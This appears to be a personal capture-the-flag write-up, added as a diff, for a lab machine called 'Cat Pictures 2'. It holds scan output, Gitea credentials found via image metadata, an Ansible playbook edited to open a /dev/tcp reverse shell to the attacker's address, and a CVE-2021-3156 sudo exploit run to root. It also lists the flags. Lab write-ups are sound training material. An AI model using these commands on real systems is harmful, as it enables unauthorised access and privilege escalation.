@@ -1,0 +1,476 @@
+Cat Pictures 2
+
+IP:10.10.217.90
+
+
+rustscan:
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack
+80/tcp   open  http       syn-ack
+222/tcp  open  rsh-spx    syn-ack
+1337/tcp open  waste      syn-ack
+3000/tcp open  ppp        syn-ack
+8080/tcp open  http-proxy syn-ack
+
+
+
+nmap:
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWn7oP+xezi54hhxJR3FAOcCt9gU+ZfOXquxFX/NC6USigzwXcxw2B4P3Yz6Huhaox1WRRgOSAYPJp9uo1gnA+ttkVdRaIqmcizbsznuU6sXntwiunD/QDNegq5UwJI3PjQu05HhnTNwGlBuiv+V/HW2OZGo0LLMY8ixqphCtAbw5uQZsV28rB2Yy1C7FYjkRzfhGePOfyq8Ga4FSpRnWz1vHYyEzFiF9tyLXNcDEdIWalKA6hrr7msEneSITE/RrGt5tynn6Rq5/3Os0mdbV0ztvqavwcWRR6B1UAJ+zPR/GKJ6s4Zr8ImoAXIZc7lFQ7Oh8DVWYp4cearg90RZUx
+|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhoBFkSKYS/dRjYASX26cs3gtgKxnLhhnXBas1fJ5i32J7h9+X8XA3GHT2SzP8/CBbs759W5q68jDA9nsTYnzo=
+|   256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (EdDSA)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMiQc+7IBNNbs8nZJ4L+ntHTLbWn0Xn5b+QnWuboKE6r
+80/tcp   open  http    syn-ack ttl 63 nginx 1.4.6 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: 60D8216C0FDE4723DCA5FBD03AD44CB7
+| http-git: 
+|   10.10.217.90:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Remotes:
+|       https://github.com/electerious/Lychee.git
+|_    Project type: PHP application (guessed from .gitignore)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 7 disallowed entries 
+|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
+|_http-server-header: nginx/1.4.6 (Ubuntu)
+|_http-title: Lychee
+222/tcp  open  ssh     syn-ack ttl 63 OpenSSH 9.0 (protocol 2.0)
+1337/tcp open  waste?  syn-ack ttl 64
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Accept-Ranges: bytes
+|     Content-Length: 3858
+|     Content-Type: text/html; charset=utf-8
+|     Date: Fri, 28 Jul 2023 08:16:19 GMT
+|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <title>OliveTin</title>
+|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
+|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
+|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
+|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
+|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
+|     </head>
+|     <body>
+|     <main title = "main content">
+|     <fieldset id = "section-switcher" title = "Sections">
+|     <button id = "showActions">Actions</button>
+|_    <button id = "showLogs">Logs</but
+3000/tcp open  ppp?    syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: no-store, no-transform
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: i_like_gitea=55a6327853a11f5d; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=DIsV4s8rlt41fiBENnSYUYvSdOc6MTY5MDUzMjE3OTUzNzg5MDUyNA; Path=/; Expires=Sat, 29 Jul 2023 08:16:19 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 28 Jul 2023 08:16:19 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-">
+|     <head>
+|     <meta charset="utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title> Gitea: Git with a cup of tea</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Cache-Control: no-store, no-transform
+|     Set-Cookie: i_like_gitea=c05cbf41e5517703; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=TqiBuLpntJIHi1yjbYI9OEX8hTw6MTY5MDUzMjE4NDc3ODg0NTIzNQ; Path=/; Expires=Sat, 29 Jul 2023 08:16:24 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 28 Jul 2023 08:16:24 GMT
+|_    Content-Length: 0
+8080/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.6.9)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
+|_http-title: Welcome to nginx!
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1337-TCP:V=7.60%I=7%D=7/28%Time=64C37954%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
+SF:x20bytes\r\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20c
+SF:harset=utf-8\r\nDate:\x20Fri,\x2028\x20Jul\x202023\x2008:16:19\x20GMT\r
+SF:\nLast-Modified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\
+SF:n<!DOCTYPE\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport
+SF:\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<ti
+SF:tle>OliveTin</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x
+SF:20=\x20\"text/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20
+SF:rel\x20=\x20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\
+SF:x20=\x20\"OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple
+SF:-touch-icon\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20
+SF:/>\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\
+SF:x20href=\"OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"a
+SF:pple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.pn
+SF:g\"\x20/>\n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20
+SF:content\">\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title
+SF:\x20=\x20\"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">A
+SF:ctions</button>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but")
+SF:%r(HTTPOptions,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r
+SF:\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20charset=utf
+SF:-8\r\nDate:\x20Fri,\x2028\x20Jul\x202023\x2008:16:19\x20GMT\r\nLast-Mod
+SF:ified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n<!DOCTYPE
+SF:\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\"\x20cont
+SF:ent=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<title>OliveT
+SF:in</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x20=\x20\"t
+SF:ext/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20rel\x20=\x
+SF:20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x20=\x20\"
+SF:OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-touch-ico
+SF:n\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/>\n\t\t<l
+SF:ink\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x20href=\"
+SF:OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"apple-touch
+SF:-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png\"\x20/>\
+SF:n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20content\">
+SF:\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\x20=\x20\
+SF:"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Actions</bu
+SF:tton>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3000-TCP:V=7.60%I=7%D=7/28%Time=64C37954%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,3775,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
+SF:\x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset
+SF:=UTF-8\r\nSet-Cookie:\x20i_like_gitea=55a6327853a11f5d;\x20Path=/;\x20H
+SF:ttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=DIsV4s8rlt41fiBENnSYUY
+SF:vSdOc6MTY5MDUzMjE3OTUzNzg5MDUyNA;\x20Path=/;\x20Expires=Sat,\x2029\x20J
+SF:ul\x202023\x2008:16:19\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
+SF:ie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSit
+SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2028\x20Jul\x
+SF:202023\x2008:16:19\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
+SF:-US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<m
+SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
+SF:ale=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</
+SF:title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;bas
+SF:e64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWU
+SF:iOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2
+SF:xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/
+SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
+SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOp
+SF:tions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Contro
+SF:l:\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=c05cbf41
+SF:e5517703;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_cs
+SF:rf=TqiBuLpntJIHi1yjbYI9OEX8hTw6MTY5MDUzMjE4NDc3ODg0NTIzNQ;\x20Path=/;\x
+SF:20Expires=Sat,\x2029\x20Jul\x202023\x2008:16:24\x20GMT;\x20HttpOnly;\x2
+SF:0SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0
+SF:;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDat
+SF:e:\x20Fri,\x2028\x20Jul\x202023\x2008:16:24\x20GMT\r\nContent-Length:\x
+SF:200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
+SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
+SF:n\r\n400\x20Bad\x20Request");
+MAC Address: 02:DB:84:FD:7B:15 (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.60%E=4%D=7/28%OT=22%CT=%CU=35689%PV=Y%DS=1%DC=D%G=N%M=02DB84%TM=64C379A6%P=x86_64-pc-linux-gnu)
+SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)
+SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 8.233 days (since Thu Jul 20 03:41:43 2023)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.31 ms ip-10-10-217-90.eu-west-1.compute.internal (10.10.217.90)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 09:17
+Completed NSE at 09:17, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 09:17
+Completed NSE at 09:17, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.69 seconds
+           Raw packets sent: 71 (6.406KB) | Rcvd: 53 (5.306KB)
+
+
+
+
+
+nikto
+nikto -h 10.10.217.90
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.217.90
++ Target Hostname:    ip-10-10-217-90.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2023-07-28 09:16:29 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.4.6 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x57543c70 0xedea 
++ The anti-clickjacking X-Frame-Options header is not present.
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.17
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ File/dir '/php/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 7 entries which should be manually viewed.
++ OSVDB-3092: /php/: This might be interesting...
++ OSVDB-3093: /.htaccess: Contains authorization information
++ OSVDB-3233: /php/index.php: Monkey Http Daemon default PHP file found.
++ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
++ 6544 items checked: 9 error(s) and 9 item(s) reported on remote host
++ End Time:           2023-07-28 09:16:38 (GMT1) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+gobuster:
+
+/.htaccess (Status: 200)
+/.git/HEAD (Status: 200)
+/data (Status: 301)
+/dist (Status: 301)
+/docs (Status: 301)
+/favicon.ico (Status: 200)
+/index.html (Status: 200)
+/LICENSE (Status: 200)
+/php (Status: 301)
+/plugins (Status: 301)
+/robots.txt (Status: 200)
+/src (Status: 301)
+/uploads (Status: 301)
+
+
+robots.txt:
+
+User-agent: *
+Disallow: /data/
+Disallow: /dist/
+Disallow: /docs/
+Disallow: /php/
+Disallow: /plugins/
+Disallow: /src/
+Disallow: /uploads/
+
+
+/php:
+
+"Error: No API function specified!"
+
+I downloaded all cat photos from the site on port 80 and run exiftool on them:
+
+root@ip-10-10-24-188:~/Desktop/CatPictures2# exiftool cat1.jpg 
+ExifTool Version Number         : 10.80
+File Name                       : cat1.jpg
+Directory                       : .
+File Size                       : 71 kB
+File Modification Date/Time     : 2023:07:28 09:28:10+01:00
+File Access Date/Time           : 2023:07:28 09:28:10+01:00
+File Inode Change Date/Time     : 2023:07:28 09:28:10+01:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+Profile CMM Type                : Unknown (lcms)
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 2012:01:25 03:41:57
+Profile File Signature          : acsp
+Primary Platform                : Apple Computer Inc.
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : 
+Device Model                    : 
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Unknown (lcms)
+Profile ID                      : 0
+Profile Description             : c2
+Profile Copyright               : IX
+Media White Point               : 0.9642 1 0.82491
+Media Black Point               : 0.01205 0.0125 0.01031
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
+XMP Toolkit                     : Image::ExifTool 12.49
+Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
+Image Width                     : 720
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 720x1080
+Megapixels                      : 0.778
+
+
+we have here a hint to the location of a txt file:
+
+note to self:
+
+I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
+This file isn't easy to find anyway unless you have the correct url...
+
+gitea: port 3000
+user: samarium
+password: TUmhyZ37CLZrhP
+
+ansible runner (olivetin): port 1337
+
+Location of flag 1: http://10.10.217.90:3000/samarium/ansible/src/branch/main/flag1.txt
+
+Flag1 : 10d916eaea54bb5ebe36b59538146bb5
+
+
+
+paybook.yaml:
+
+---
+- name: Test 
+  hosts: all                                  # Define all the hosts
+  remote_user: bismuth                                  
+  # Defining the Ansible task
+  tasks:             
+    - name: get the username running the deploy
+      become: false
+      command: whoami
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: echo hi
+
+
+
+
+  Foothold:
+  
+  modify the playbook.yaml file in order to get a reverse shell:
+
+
+  ---
+- name: Test 
+  hosts: all                                  # Define all the hosts
+  remote_user: bismuth                                  
+  # Defining the Ansible task
+  tasks:             
+    - name: get the username running the deploy
+      become: false
+      command: bash -c "sh -i >& /dev/tcp/10.10.24.188/4444 0>&1"
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: echo hi
+      
+
+   start a nc listener and run the ansible playbook to get a reverse shell back:
+
+   root@ip-10-10-24-188:~/Desktop/CatPictures2# nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+
+Connection from 10.10.217.90 33324 received!
+$ $ id
+uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+bismuth@catpictures-ii:~$ 
+
+
+bismuth@catpictures-ii:~$ cat flag2.txt
+cat flag2.txt
+5e2cafbbf180351702651c09cd797920
+
+
+Privilege escalation:
+
+
+run linpeas.sh, and check baron exploit:
+
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+
+bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0
+./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
+# pwd
+pwd
+/tmp/CVE-2021-3156
+# cd /root
+cd /root
+# ls
+ls
+ansible  docker-compose.yaml  flag3.txt  gitea
+# cat flag3.txt
+cat flag3.txt
+6d2a9f8f8174e86e27d565087a28a971
+# 
+
+    
